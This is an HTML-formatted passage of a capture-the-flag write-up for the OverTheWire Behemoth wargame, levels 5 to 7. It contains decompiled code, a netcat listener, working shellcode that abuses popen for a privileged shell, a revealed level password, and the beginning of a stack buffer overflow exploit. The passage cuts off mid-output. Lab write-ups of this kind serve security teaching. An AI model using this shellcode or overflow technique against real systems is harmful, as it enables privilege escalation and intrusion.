class="c0">&quot;r&quot;</span><span class="c8">);<br> &nbsp;</span><span class="c7">if</span><span class="c8">&nbsp;(local_18 == (FILE *)</span><span class="c4">0</span><span class="c8">x0) {<br> &nbsp; &nbsp;perror(</span><span class="c0">&quot;fopen&quot;</span><span class="c8">);<br> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;</span><span class="c3">/* WARNING: Subroutine does not return */</span><span class="c8"><br> &nbsp; &nbsp;</span><span class="c7">exit</span><span class="c8">(</span><span class="c4">1</span><span class="c8">);<br> &nbsp;}<br> &nbsp;fseek(local_18,</span><span class="c4">0</span><span class="c8">,</span><span class="c4">2</span><span class="c8">);<br> &nbsp;lVar1 = ftell(local_18);<br> &nbsp;local_14 = lVar1 + </span><span class="c4">1</span><span class="c8">;<br> &nbsp;rewind(local_18);<br> &nbsp;local_1c = (char *)malloc(local_14);<br> &nbsp;fgets(local_1c,local_14,local_18);<br> &nbsp;sVar2 = strlen(local_1c);<br> &nbsp;local_1c[sVar2] = </span><span class="c0">&#39;\0&#39;</span><span class="c8">;<br> &nbsp;fclose(local_18);<br> &nbsp;local_20 = gethostbyname(</span><span class="c0">&quot;localhost&quot;</span><span class="c8">);<br> &nbsp;</span><span class="c7">if</span><span class="c8">&nbsp;(local_20 == (hostent *)</span><span class="c4">0</span><span class="c8">x0) {<br> &nbsp; &nbsp;perror(</span><span class="c0">&quot;gethostbyname&quot;</span><span class="c8">);<br> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;</span><span class="c3">/* WARNING: Subroutine does not return */</span><span class="c8"><br> &nbsp; &nbsp;</span><span class="c7">exit</span><span class="c8">(</span><span class="c4">1</span><span class="c8">);<br> &nbsp;}<br> &nbsp;local_24 = socket(</span><span class="c4">2</span><span class="c8">,</span><span class="c4">2</span><span class="c8">,</span><span class="c4">0</span><span class="c8">);<br> &nbsp;</span><span class="c7">if</span><span class="c8">&nbsp;(local_24 == -</span><span class="c4">1</span><span class="c8">) {<br> &nbsp; &nbsp;perror(</span><span class="c0">&quot;socket&quot;</span><span class="c8">);<br> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;</span><span class="c3">/* WARNING: Subroutine does not return */</span><span class="c8"><br> &nbsp; &nbsp;</span><span class="c7">exit</span><span class="c8">(</span><span class="c4">1</span><span class="c8">);<br> &nbsp;}<br> &nbsp;local_38._0_2_ = </span><span class="c4">2</span><span class="c8">;<br> &nbsp;iVar3 = atoi(</span><span class="c0">&quot;1337&quot;</span><span class="c8">);<br> &nbsp;local_38._2_2_ = htons((uint16_t)iVar3);<br> &nbsp;local_34 = *(undefined4 *)*local_20-&gt;h_addr_list;<br> &nbsp;memset(auStack48,</span><span class="c4">0</span><span class="c8">,</span><span class="c4">8</span><span class="c8">);<br> &nbsp;sVar2 = strlen(local_1c);<br> &nbsp;local_28 = sendto(local_24,local_1c,sVar2,</span><span class="c4">0</span><span class="c8">,(sockaddr *)local_38,</span><span class="c4">0</span><span class="c8">x10);<br> &nbsp;</span><span class="c7">if</span><span class="c8">&nbsp;(local_28 == -</span><span class="c4">1</span><span class="c8">) {<br> &nbsp; &nbsp;perror(</span><span class="c0">&quot;sendto&quot;</span><span class="c8">);<br> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;</span><span class="c3">/* WARNING: Subroutine does not return */</span><span class="c8"><br> &nbsp; &nbsp;</span><span class="c7">exit</span><span class="c8">(</span><span class="c4">1</span><span class="c8">);<br> &nbsp;}<br> &nbsp;close(local_24);<br> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;</span><span class="c3">/* WARNING: Subroutine does not return */</span><span class="c8"><br> &nbsp;</span><span class="c7">exit</span><span class="c8">(</span><span class="c4">0</span><span class="c8">);<br>}</span></p></td></tr></table><p class="c9"><span class="c13"></span></p><p class="c12"><span>After many different variables are declared, the password for the behemoth6 user is read into the program. Afterwards, the </span><span class="c22 c35">gethostbyaddressname</span><span>&nbsp;function is called with the argument &ldquo;localhost&rdquo;. Shortly afterwards, the socket function is called using the arguments </span><span class="c22 c35">(2,2,0)</span><span class="c13">. Observe the following code and the corresponding Ghidra output:</span></p><p class="c12"><span class="c22">Source</span><span class="c56 c50 c29">1</span><span class="c15">:</span></p><p class="c47 c36"><span style="overflow: hidden; display: inline-block; margin: 0.00px 0.00px; border: 0.00px solid #000000; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px); width: 507.00px; height: 26.00px;"><img alt="" src="images/image12.png" style="width: 507.00px; height: 26.00px; margin-left: 0.00px; margin-top: 0.00px; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px);" title=""></span></p><p class="c12"><span class="c22">Ghidra</span><span class="c50 c29 c56">1</span><span class="c15">:</span></p><p class="c47 c36"><span style="overflow: hidden; display: inline-block; margin: 0.00px 0.00px; border: 0.00px solid #000000; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px); width: 184.00px; height: 18.00px;"><img alt="" src="images/image4.png" style="width: 184.00px; height: 18.00px; margin-left: 0.00px; margin-top: 0.00px; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px);" title=""></span></p><p class="c12"><span class="c22">Source</span><span class="c56 c50 c29">2</span><span class="c15">:</span></p><p class="c47 c36"><span style="overflow: hidden; display: inline-block; margin: 0.00px 0.00px; border: 0.00px solid #000000; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px); width: 509.00px; height: 28.00px;"><img alt="" src="images/image7.png" style="width: 509.00px; height: 28.00px; margin-left: 0.00px; margin-top: 0.00px; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px);" title=""></span></p><p class="c12"><span class="c22">Ghidra</span><span class="c56 c50 c29">2</span><span class="c15">:</span></p><p class="c47 c36"><span style="overflow: hidden; display: inline-block; margin: 0.00px 0.00px; border: 0.00px solid #000000; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px); width: 177.00px; height: 17.00px;"><img alt="" src="images/image1.png" style="width: 177.00px; height: 17.00px; margin-left: 0.00px; margin-top: 0.00px; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px);" title=""></span></p><p class="c12"><span class="c22">Source</span><span class="c56 c50 c29">3</span><span class="c15">:</span></p><p class="c47 c36"><span>&nbsp; </span><span style="overflow: hidden; display: inline-block; margin: 0.00px 0.00px; border: 0.00px solid #000000; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px); width: 499.00px; height: 27.00px;"><img alt="" src="images/image3.png" style="width: 499.00px; height: 27.00px; margin-left: 0.00px; margin-top: 0.00px; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px);" title=""></span><span class="c13">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span></p><p class="c12"><span class="c22">Ghidra</span><span class="c56 c50 c29">3</span><span class="c15">:</span></p><p class="c47 c36"><span style="overflow: hidden; display: inline-block; margin: 0.00px 0.00px; border: 0.00px solid #000000; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px); width: 179.00px; height: 18.00px;"><img alt="" src="images/image11.png" style="width: 179.00px; height: 18.00px; margin-left: 0.00px; margin-top: 0.00px; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px);" title=""></span></p><p class="c12"><span>The socket arguments of Ghidra</span><span class="c56">3</span><span>&nbsp;are identical to the arguments seen from behemoth5. Therefore, the arguments seen in the behemoth5 binary correspond to iPv4, UDP, and default protocol respectively</span><sup><a href="#ftnt7" id="ftnt_ref7">[7]</a></sup><span class="c13">. </span></p><p class="c12"><span>Following the calling of the socket function, </span><span class="c22 c35">iVar3</span><span>&nbsp;is set to be 1337 before a </span><span class="c22 c35">sendto</span><span class="c13">&nbsp;function is called. From these lines of code, it can be discerned that a UDP socket is opened on port 1337, and the password of the behemoth6 user is sent to it.</span></p><h3 class="c19" id="h.ucvx5cuzou25"><span class="c25 c22">Catching Behemoth6 Password Through UDP</span></h3><p class="c12"><span class="c13">Before executing the binary, it is essential that another session be opened so that a UDP listener can be set up on port 1337:</span></p><a id="t.0fb52b7f2317c814cd0789545ed973e1c36c438f"></a><a id="t.56"></a><table class="c5"><tr class="c10"><td class="c2" colspan="1" rowspan="1"><p class="c1"><span class="c8">behemoth5</span><span class="c3">@behemoth</span><span class="c0">:~</span><span class="c3">$ </span><span class="c8">nc -lup </span><span class="c4">1337</span><span class="c8">&nbsp;</span><span class="c4">localhost</span></p></td></tr></table><p class="c12"><span class="c32 c16">The -u flag specifies UDP mode, -p is for specifying a port, and -l tells nc to listen for inbound connections</span></p><p class="c9"><span class="c13"></span></p><p class="c12"><span class="c13">After executing the binary, the password of the behemoth6 user can be seen on stdout:</span></p><p class="c12"><span style="overflow: hidden; display: inline-block; margin: 0.00px 0.00px; border: 0.00px solid #000000; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px); width: 491.00px; height: 105.00px;"><img alt="" src="images/image10.png" style="width: 491.00px; height: 105.00px; margin-left: 0.00px; margin-top: 0.00px; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px);" title=""></span></p><p class="c12"><span class="c39 c16">Note that the blue line is a result of using tmux</span><sup class="c16 c39"><a href="#ftnt8" id="ftnt_ref8">[8]</a></sup><span class="c32 c16">, and it represents the delimiter between different sessions</span></p><p class="c9"><span class="c16 c27"></span></p><p class="c12"><span class="c13">This challenge was more of a reverse engineering exercise, but it is good practice for developing the skill of understanding the functionality of a binary. </span></p><h2 class="c19" id="h.1iiwc3vpzmaj"><span class="c46 c22">Behemoth 6</span></h2><p class="c12"><span class="c13">After logging in as the behemoth6 user and executing the behemoth6 binary, the following output is seen:</span></p><a id="t.63fbff81ffa6d42a60602054712edb7c8a0501bb"></a><a id="t.57"></a><table class="c5"><tr class="c10"><td class="c2" colspan="1" rowspan="1"><p class="c1"><span class="c8">behemoth6</span><span class="c3">@behemoth</span><span class="c0">:/behemoth</span><span class="c3">$ </span><span class="c8">./behemoth6<br>Incorrect output.</span></p></td></tr></table><p class="c9"><span class="c13"></span></p><p class="c12"><span>Furthermore, performing the </span><span class="c29">ls</span><span>&nbsp;command on the </span><span class="c29">/behemoth</span><span class="c13">&nbsp;directory reveals another interesting file possibly related to behemoth6:</span></p><a id="t.dabdee2b837c9d7b858117de3fb4e8e79ad9a990"></a><a id="t.58"></a><table class="c5"><tr class="c10"><td class="c2" colspan="1" rowspan="1"><p class="c1"><span class="c8">behemoth6@behemoth:/behemoth$ ls <br>behemoth0 &nbsp;behemoth1 &nbsp;behemoth2 &nbsp;behemoth3 &nbsp;behemoth4 &nbsp;behemoth5 &nbsp;behemoth6 &nbsp;behemoth6_reader &nbsp;behemoth7</span></p></td></tr></table><p class="c9"><span class="c13"></span></p><p class="c12"><span>Namely, that file is called behmoth6_reader and it might be used by the behemoth6 binary. </span><span class="c13">After downloading the binary onto the attack box, the binary can be analyzed with the help of Ghidra.</span></p><h3 class="c19" id="h.tihwa7xhbihg"><span class="c25 c22">Ghidra</span></h3><p class="c12"><span class="c13">Ghidra translated the assembly code found for each binary into the following:</span></p><p class="c12"><span style="overflow: hidden; display: inline-block; margin: 0.00px 0.00px; border: 0.00px solid #000000; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px); width: 624.00px; height: 413.33px;"><img alt="" src="images/image9.png" style="width: 624.00px; height: 413.33px; margin-left: 0.00px; margin-top: 0.00px; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px);" title=""></span></p><p class="c12"><span>The code on the left was produced by the behemoth6 binary, while the code on the right is from the behemoth_reader. Looking at the code for the bhemeoth6_reader program, a file named </span><span class="c29">shellcode.txt</span><span class="c13">&nbsp;is expected. However, the contents of this file are not printed out anywhere. If a file named shellcode.txt exists, then a small sanitization is performed against the file: if the 0xb byte exists within the file, then the program immediately exits. </span></p><p class="c9"><span class="c13"></span></p><p class="c12"><span class="c13">In short, the program is executing the contents of the shellcode.txt file as machine code. Therefore, shellcode will get executed by the binary. This, however, will not directly result in a privileged shell due to the fact that the SETUID bit is not enabled on the behemoth6_reader binary. Rather, the behemoth6 binary has the SETUID bit, and its interaction with the behemoth6_reader will determine the significance of the shellcode.</span></p><p class="c12"><span>Looking at the code for behemoth6, observe that the file is opened using the </span><span class="c22 c35">popen</span><span>&nbsp;function in read mode, after which the output is passed into the </span><span class="c22 c35">__stream</span><span>&nbsp;variable. This variable then gets passed into </span><span class="c22 c35">__s1</span><span class="c13">&nbsp;which is compared against the string &lsquo;HelloKitty&rsquo; in the strcmp function. If the contents of this variable matches the string, then a /bin/sh shell is returned. </span></p><h3 class="c19" id="h.fngzaxqi0ncb"><span class="c25 c22">Abusing popen()</span></h3><p class="c12"><span>The output of the popen function is determined by the behemoth6_reader. Consequently, if the behemoth6_reader executes shellcode that makes it print out &lsquo;HelloKitty&rsquo;, then a shell will be returned. There are already shellcodes online that perform this operation, and the following shellcode was used</span><sup><a href="#ftnt9" id="ftnt_ref9">[9]</a></sup><span class="c13">:</span></p><a id="t.00ac67bacf9a7390c0f2260b041384db29392f4a"></a><a id="t.59"></a><table class="c5"><tr class="c10"><td class="c2" colspan="1" rowspan="1"><p class="c1"><span class="c8">char code[] = <br><br> &nbsp; &nbsp;</span><span class="c0">&quot;\xe9\x1e\x00\x00\x00&quot;</span><span class="c8">&nbsp; // &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;jmp &nbsp; &nbsp;(relative) &lt;MESSAGE&gt;<br> &nbsp; &nbsp;</span><span class="c0">&quot;\xb8\x04\x00\x00\x00&quot;</span><span class="c8">&nbsp; // &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;mov &nbsp; &nbsp;</span><span class="c3">$0x4</span><span class="c8">,%eax<br> &nbsp; &nbsp;</span><span class="c0">&quot;\xbb\x01\x00\x00\x00&quot;</span><span class="c8">&nbsp; // &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;mov &nbsp; &nbsp;</span><span class="c3">$0x1</span><span class="c8">,%ebx<br> &nbsp; &nbsp;</span><span class="c0">&quot;\x59&quot;</span><span class="c8">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; // &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;pop &nbsp; &nbsp;%ecx<br> &nbsp; &nbsp;</span><span class="c0">&quot;\xba\x0f\x00\x00\x00&quot;</span><span class="c8">&nbsp; // &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;mov &nbsp; &nbsp;</span><span class="c3">$0xf</span><span class="c8">,%edx<br> &nbsp; &nbsp;</span><span class="c0">&quot;\xcd\x80&quot;</span><span class="c8">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; // &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;int &nbsp; &nbsp;</span><span class="c3">$0x80</span><span class="c8"><br> &nbsp; &nbsp;</span><span class="c0">&quot;\xb8\x01\x00\x00\x00&quot;</span><span class="c8">&nbsp; // &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;mov &nbsp; &nbsp;</span><span class="c3">$0x1</span><span class="c8">,%eax<br> &nbsp; &nbsp;</span><span class="c0">&quot;\xbb\x00\x00\x00\x00&quot;</span><span class="c8">&nbsp; // &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;mov &nbsp; &nbsp;</span><span class="c3">$0x0</span><span class="c8">,%ebx<br> &nbsp; &nbsp;</span><span class="c0">&quot;\xcd\x80&quot;</span><span class="c8">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; // &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;int &nbsp; &nbsp;</span><span class="c3">$0x80</span><span class="c8"><br> &nbsp; &nbsp;</span><span class="c0">&quot;\xe8\xdd\xff\xff\xff&quot;</span><span class="c8">&nbsp; // &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;call &nbsp; (relative) &lt;GOBACK&gt;</span></p></td></tr></table><p class="c9"><span class="c13"></span></p><p class="c12"><span>The code above prints out whatever string follows it (however the string must be in machine code). This code, coupled with a subsequent string in shellcode will result in a successful.string comparison. To facilitate the conversion between ascii and shellcode, a conversion table</span><sup><a href="#ftnt10" id="ftnt_ref10">[10]</a></sup><span class="c13">&nbsp;was used. </span></p><p class="c9"><span class="c13"></span></p><p class="c12"><span class="c15">Ascii:</span></p><p class="c47 c36"><span class="c15">HelloKitty</span></p><p class="c12"><span class="c15">Shellcode:</span></p><p class="c47 c36"><span class="c15">\x48\x65\x6c\x6c\x6f\x4b\x69\x74\x74\x79</span></p><p class="c9"><span class="c13"></span></p><p class="c12"><span class="c13">After creating a directory in /tmp (so as to be able to create files), the following code was printed into shellcode.txt:</span></p><a id="t.e51b02e0765441b048abf0c87de30254827d6440"></a><a id="t.60"></a><table class="c5"><tr class="c10"><td class="c2" colspan="1" rowspan="1"><p class="c1"><span class="c8">behemoth6@behemoth:/tmp/behemoth6$ &nbsp;python -c </span><span class="c0">&quot;print &#39;\xe9\x1e\x00\x00\x00\xb8\x04\x00\x00\x00\xbb\x01\x00\x00\x00\x59\xba\x0f\x00\x00\x00\xcd\x80\xb8\x01\x00\x00\x00\xbb\x00\x00\x00\x00\xcd\x80\xe8\xdd\xff\xff\xff&#39; +&#39;\x48\x65\x6c\x6c\x6f\x4b\x69\x74\x74\x79&#39;&quot;</span><span class="c8">&nbsp;&gt; shellcode.txt</span></p></td></tr></table><p class="c9"><span class="c13"></span></p><p class="c12"><span>Now when executing the behemoth6 binary, the shellcode file will be called when the behemoth6_reader is executed via the popen function, subsequently making the reader print out </span><span class="c29">HelloKitty</span><span class="c13">. This will cause the strcmp function to run true, and a /bin/sh shell is subsequently returned: </span></p><a id="t.4d7a0c8f6533d025606767457873d37476420c26"></a><a id="t.61"></a><table class="c5"><tr class="c10"><td class="c2" colspan="1" rowspan="1"><p class="c1"><span class="c8">behemoth6@behemoth:/tmp/behemoth6$ /behemoth/behemoth6<br>Correct.<br>$ whoami<br>behemoth7<br>$ cat /etc/behemoth_pass/behemoth7<br>baquoxuafo</span></p></td></tr></table><h2 class="c19" id="h.tqwpdz749mlq"><span>Behemoth 7</span></h2><p class="c12"><span class="c13">After successfully exploiting the behemoth6 binary, we are left with the final challenge of exploiting the behemoth7 binary.</span></p><h3 class="c19" id="h.xjoju0hpie6u"><span class="c25 c22">Binary Analysis</span></h3><p class="c12"><span class="c13">Before analysing the binary within tools such as GDB and Ghidra, it is advised to first start by executing the binary to observe its behavior.</span></p><h4 class="c11" id="h.lza0jils5m5d"><span class="c44 c22">Behavior</span></h4><p class="c12"><span class="c13">Upon executing the binary, nothing conspicuous occurs. The binary immediately exits after execution without printing anything to stdout.</span></p><h4 class="c11" id="h.88k4lr9djkg2"><span class="c44 c22">Ghidra</span></h4><p class="c12"><span class="c13">After downloading the binary onto the attack box, the binary can be analyzed with the help of Ghidra. Using Ghidra, the assembly code of the binary was converted to the following code:</span></p><a id="t.da63e7666f872e9c4b8ce60effd7ac09229ec9db"></a><a id="t.62"></a><table class="c5"><tr class="c10"><td class="c2" colspan="1" rowspan="1"><p class="c1"><span class="c8">undefined4 </span><span class="c24">main</span><span class="c4">(</span><span class="c7">int</span><span class="c4">&nbsp;param_1,</span><span class="c7">int</span><span class="c4">&nbsp;param_2,</span><span class="c7">int</span><span class="c4">&nbsp;param_3)</span><span class="c8"><br><br>{<br> &nbsp;</span><span class="c7">size_t</span><span class="c8">&nbsp;__n;<br> &nbsp;ushort **ppuVar1;<br> &nbsp;</span><span class="c7">char</span><span class="c8">&nbsp;local_210 [</span><span class="c4">512</span><span class="c8">];<br> &nbsp;</span><span class="c7">int</span><span class="c8">&nbsp;local_10;<br> &nbsp;</span><span class="c7">int</span><span class="c8">&nbsp;local_c;<br> &nbsp;</span><span class="c7">char</span><span class="c8">&nbsp;*local_8;<br> &nbsp;<br> &nbsp;local_8 = *(</span><span class="c7">char</span><span class="c8">&nbsp;**)(param_2 + </span><span class="c4">4</span><span class="c8">);<br> &nbsp;local_c = </span><span class="c4">0</span><span class="c8">;<br> &nbsp;</span><span class="c7">while</span><span class="c8">&nbsp;(*(</span><span class="c7">int</span><span class="c8">&nbsp;*)(param_3 + local_c * </span><span class="c4">4</span><span class="c8">) != </span><span class="c4">0</span><span class="c8">) {<br> &nbsp; &nbsp;__n = </span><span class="c4">strlen</span><span class="c8">(*(</span><span class="c7">char</span><span class="c8">&nbsp;**)(param_3 + local_c * </span><span class="c4">4</span><span class="c8">));<br> &nbsp; &nbsp;</span><span class="c4">memset</span><span class="c8">(*(</span><span class="c7">void</span><span class="c8">&nbsp;**)(param_3 + local_c * </span><span class="c4">4</span><span class="c8">),</span><span class="c4">0</span><span class="c8">,__n);<br> &nbsp; &nbsp;local_c = local_c + </span><span class="c4">1</span><span class="c8">;<br> &nbsp;}<br> &nbsp;local_10 = </span><span class="c4">0</span><span class="c8">;<br> &nbsp;</span><span class="c7">if</span><span class="c8">&nbsp;(</span><span class="c4">1</span><span class="c8">&nbsp;&lt; param_1) {<br> &nbsp; &nbsp;</span><span class="c7">while</span><span class="c8">&nbsp;((*local_8 != </span><span class="c0">&#39;\0&#39;</span><span class="c8">&nbsp;&amp;&amp; (local_10 &lt; </span><span class="c4">0x200</span><span class="c8">))) {<br> &nbsp; &nbsp; &nbsp;local_10 = local_10 + </span><span class="c4">1</span><span class="c8">;<br> &nbsp; &nbsp; &nbsp;ppuVar1 = __ctype_b_loc();<br> &nbsp; &nbsp; &nbsp;</span><span class="c7">if</span><span class="c8">&nbsp;((((*ppuVar1)[*local_8] &amp; </span><span class="c4">0x400</span><span class="c8">) == </span><span class="c4">0</span><span class="c8">) &amp;&amp;<br> &nbsp; &nbsp; &nbsp; &nbsp; (ppuVar1 = __ctype_b_loc(), ((*ppuVar1)[*local_8] &amp; </span><span class="c4">0x800</span><span class="c8">) == </span><span class="c4">0</span><span class="c8">)) {<br> &nbsp; &nbsp; &nbsp; &nbsp;</span><span class="c4">fprintf</span><span class="c8">(</span><span class="c4">stderr</span><span class="c8">,</span><span class="c0">&quot;Non-%s chars found in string, possible shellcode!\n&quot;</span><span class="c8">,</span><span class="c0">&quot;alpha&quot;</span><span class="c8">);<br> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;</span><span class="c17">/* WARNING: Subroutine does not return */</span><span class="c8"><br> &nbsp; &nbsp; &nbsp; &nbsp;</span><span class="c4">exit</span><span class="c8">(</span><span class="c4">1</span><span class="c8">);<br> &nbsp; &nbsp; &nbsp;}<br> &nbsp; &nbsp; &nbsp;local_8 = local_8 + </span><span class="c4">1</span><span class="c8">;<br> &nbsp; &nbsp;}<br> &nbsp; &nbsp;</span><span class="c4">strcpy</span><span class="c8">(local_210,*(</span><span class="c7">char</span><span class="c8">&nbsp;**)(param_2 + </span><span class="c4">4</span><span class="c8">));<br> &nbsp;}<br> &nbsp;</span><span class="c7">return</span><span class="c8">&nbsp;</span><span class="c4">0</span><span class="c8">;<br>}</span></p></td></tr></table><p class="c9"><span class="c13"></span></p><p class="c9"><span class="c13"></span></p><p class="c9"><span class="c13"></span></p><p class="c9"><span class="c13"></span></p><p class="c12"><span>At the very top of the code, it can be seen that the main function takes three parameters. These parameters most likely correspond to the input given by argc</span><sup><a href="#ftnt11" id="ftnt_ref11">[11]</a></sup><span>. At the top of the main function are declarations of variables, and among them is </span><span class="c22 c35">local_210</span><span class="c13">&nbsp;with 512 bytes allocated to it. Toward the middle of the main function is a while loop located within an if statement. Inside of the while loop is an if statement which, upon running true, prints the following: </span></p><p class="c9"><span class="c23 c22 c35"></span></p><p class="c12"><span class="c22 c35">fprintf(stderr,&quot;Non-%s chars found in string, possible shellcode!\n&quot;,&quot;alpha&quot;);</span><span class="c13">&nbsp; </span></p><p class="c9"><span class="c13"></span></p><p class="c12"><span>Therefore, it is likely there is a filter on non alphanumeric characters</span><sup><a href="#ftnt12" id="ftnt_ref12">[12]</a></sup><span class="c13">. This could limit the possible shellcode that could be used if the EIP register cannot be overwritten. However, looking at the code, there does not seem to be any boundary checks, and the EIP register should capable of being overwritten. This can be verified by inputting a large number of bytes into the program:</span></p><a id="t.4b864c614a5ad935202a026f5500c9fe6ab6f286"></a><a id="t.63"></a><table class="c5"><tr class="c10"><td class="c2" colspan="1" rowspan="1"><p class="c1"><span class="c8">behemoth7</span><span class="c3">@behemoth</span><span class="c0">:/behemoth</span><span class="c3">$ </span><span class="c8">gdb -q /behemoth/behemoth7<br>Reading symbols from /behemoth/behemoth7...(no debugging symbols found)...done.<br>(gdb) r </span><span class="c3">$(</span><span class="c8">python -c </span><span class="c0">&quot;print &#39;A&#39;*1000&quot;</span><span class="c8">)<br>Starting </span><span class="c0">program:</span><span class="c8">&nbsp;/behemoth/behemoth7 </span><span class="c3">$(</span><span class="c8">python -c </span><span class="c0">&quot;print &#39;A&#39;*1000&quot;</span><span class="c8">)<br><br>Program received signal SIGSEGV, Segmentation fault.<br></span><span class="c4">0x41414141</span><span class="c8">&nbsp;</span><span class="c7">in</span><span class="c8">&nbsp;?? ()</span></p></td></tr></table><p class="c9"><span class="c13"></span></p><p class="c12"><span>The EIP register was successfully overwritten as can be seen by the value of the instruction pointer (</span><span class="c4">0x41414141</span><span>), which is </span><span class="c29">AAAA </span><span class="c13">in hex. Therefore, the shellcode that will be used for exploiting this binary does not have to be made of alphanumeric characters. </span></p><h3 class="c19" id="h.ltv1zu8li5yq"><span class="c25 c22">Constructing Payload</span></h3><p class="c12"><span class="c13">The payload will consist of the necessary amount of bytes to equal the EIP offset, followed by the address of the shellcode, after which the NOP sled will be declared which precedes the shellcode. </span></p><h4 class="c11" id="h.brbnafv8klgo"><span class="c44 c22">Calculating EIP Offset</span></h4><p class="c12"><span class="c13">To begin the construction of the exploit, the EIP offset must first be calculated:</span></p><a id="t.fbbc35d9ed43a11455ef6357c99b3eaca1ddf3b9"></a><a id="t.64"></a><table class="c5"><tr class="c10"><td class="c2" colspan="1" rowspan="1"><p class="c1"><span class="c8">pwndbg&gt; r $(cyclic </span><span class="c4">1000</span><span class="c8">) &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <br>Starting program: /home/0xd4y/business/other/overthewire/behemoth/</span><span class="c4">7</span><span class="c8">/behemoth7 $(cyclic </span><span class="c4">1000</span><span class="c8">)<br> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<br>Program received signal SIGSEGV, Segmentation fault.<br></span><span class="c4">0x66616168</span><span class="c8">&nbsp;</span><span class="c7">in</span><span class="c8">&nbsp;?? () &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<br></span><span class="c0">LEGEND:</span><span class="c8">&nbsp;STACK | HEAP | CODE | DATA | RWX | RODATA<br>&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;[ REGISTERS ]&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;<br> </span><span class="c4">EAX</span><span class="c8">&nbsp; </span><span class="c4">0x0</span><span class="c8">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; 